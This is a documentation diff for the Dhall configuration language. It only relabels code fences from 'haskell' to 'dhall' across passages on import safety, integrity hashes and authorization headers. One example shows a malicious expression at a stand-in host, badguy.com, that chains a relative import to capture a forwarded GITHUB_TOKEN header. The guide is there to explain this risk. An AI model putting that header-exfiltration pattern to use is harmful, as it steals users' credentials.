@@ -53,7 +53,7 @@ The following configuration file is a valid Dhall expression that:
 * imports the user's name from the `USER` environment variable
 * imports a type from a relative file located at `./schema.dhall`
 
-```haskell
+```dhall
 let concatSep = http://prelude.dhall-lang.org/Text/concatSep
 
 in  { name = env:USER as Text
@@ -82,7 +82,7 @@ indirection in the expression, like this:
 $ dhall --annotate <<< 'http://prelude.dhall-lang.org/Text/concatSep'
 ```
 
-```haskell
+```dhall
   (   λ(separator : Text)
     → λ(elements : List Text)
     → merge
@@ -113,7 +113,7 @@ $ dhall --annotate <<< 'http://prelude.dhall-lang.org/Text/concatSep'
 The `--annotate` flag adds a type annotation to the end of the expression,
 which summarizes what the function does:
 
-```haskell
+```dhall
 : ∀(separator : Text) → ∀(elements : List Text) → Text
 ```
 
@@ -126,7 +126,7 @@ language is not Turing-complete.
 If you understand and trust what you see then you can freeze the import using
 an integrity check.  If you replace the `dhall` command with `dhall hash`:
 
-```haskell
+```dhall
 $ dhall hash <<< 'http://prelude.dhall-lang.org/Text/concatSep'
 ```
 
@@ -137,7 +137,7 @@ sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a
 ... then you will get a hash that you can append to an import to freeze the
 imported expression, like this:
 
-```haskell
+```dhall
 let concatSep = http://prelude.dhall-lang.org/Prelude/Text/concatSep sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a
 
 in  { name = env:USER as Text
@@ -166,14 +166,14 @@ payload of an import does not uniquely determine the import's meaning.  To see
 why, suppose that the following contrived configuration file imports a boolean
 value from another file named `./bool.dhall`, like this:
 
-```haskell
+```dhall
 [ True, ./bool.dhall ]
 ```
 
 ... and the `./bool.dhall` file contains yet another reference to file named
 `./number.dhall`:
 
-```haskell
+```dhall
 -- ./bool.dhall
 
 Natural/even ./number.dhall
@@ -181,7 +181,7 @@ Natural/even ./number.dhall
 
 ... where `./number.dhall` might contain:
 
-```haskell
+```dhall
 -- ./number.dhall
 
 4
@@ -207,7 +207,7 @@ information about your environment or exfiltrate data to an untrusted source.
 
 Revisiting our previous example:
 
-```haskell
+```dhall
 let concatSep = http://prelude.dhall-lang.org/Prelude/Text/concatSep sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a
 
 in  { name = env:USER as Text
@@ -228,7 +228,7 @@ Another potential attack vector is Dhall's support for custom HTTP/HTTPS headers
 For example, you can import Dhall expressions from private GitHub repositories
 by authorizing the request with a secure token, like this:
 
-```haskell
+```dhall
 https://raw.githubusercontent.com/yourCompany/somePrivateRepository/master/someExpression.dhall
     using [ { header = "Authorization", value = "token ${env:GITHUB_TOKEN as Text}" } ]
           -- The above line authorize the request
@@ -248,7 +248,7 @@ your environment variables.
 This means that if an attacker tried to steal your `GITHUB_TOKEN` by hosting the
 following malicious expressions:
 
-```haskell
+```dhall
 -- https://badguy.com/pleaseImportMe.dhall
 
 https://badguy.com/iRecordHeaders.dhall
@@ -275,13 +275,13 @@ Dhall expressions imported from a web service can reference other expressions
 hosted at the same domain via relative imports.  For example, if you import an
 expression from `example.com`, like this:
 
-```haskell
+```dhall
 https://example.com/list.dhall
 ```
 
 ... and the expression hosted there is:
 
-```haskell
+```dhall
 [ 1, 2, ./natural.dhall ]
 ```
 
@@ -293,7 +293,7 @@ However, this feature also requires support for automatically forwarding any
 custom headers to expressions imported via relative imports.  For example, if
 you import an expression from a private GitHub repository, like this:
 
-```haskell
+```dhall
 https://raw.githubusercontent.com/yourCompany/somePrivateRepository/master/someExpression.dhall
     using [ { header = "Authorization", value = "token ${env:GITHUB_TOKEN as Text}" } ]
 ```
@@ -453,7 +453,7 @@ returns an empty value:
 ```console
 $ dhall <<< 'List/head Natural ([] : List Natural)'
 ```
-```haskell
+```dhall
 None Natural
 ```
 
@@ -471,7 +471,7 @@ For example, you can add any two `Natural` numbers using the `+` operator:
 ```console
 $ dhall <<< '2 + 3'
 ```
-```haskell
+```dhall
 5
 ```
 
@@ -479,7 +479,7 @@ $ dhall <<< '2 + 3'
 You will get a type error if you try to do so, such as in the following
 anonymous function:
 
-```haskell
+```dhall
 \(x : Optional Natural) → x + 3  -- Type error
 ```
 
@@ -491,7 +491,7 @@ You have to explicitly modify the function to handle the `Optional` input by
 specifying what do to if the value is absent, typically by using
 `Optional/fold`:
 
-```haskell
+```dhall
     \(o : Optional Natural)
     -- Default `x` to `0` if `x` is absent
 ->  let x = Optional/fold Natural o Natural (\(n : Natural) -> n) 0
@@ -502,7 +502,7 @@ specifying what do to if the value is absent, typically by using
 This benefit also applies to your configuration file's schema.  If your
 program expects a configuration file of type:
 
-```haskell
+```dhall
 { name : Text
 , age : Natural
 , hobbies : Text
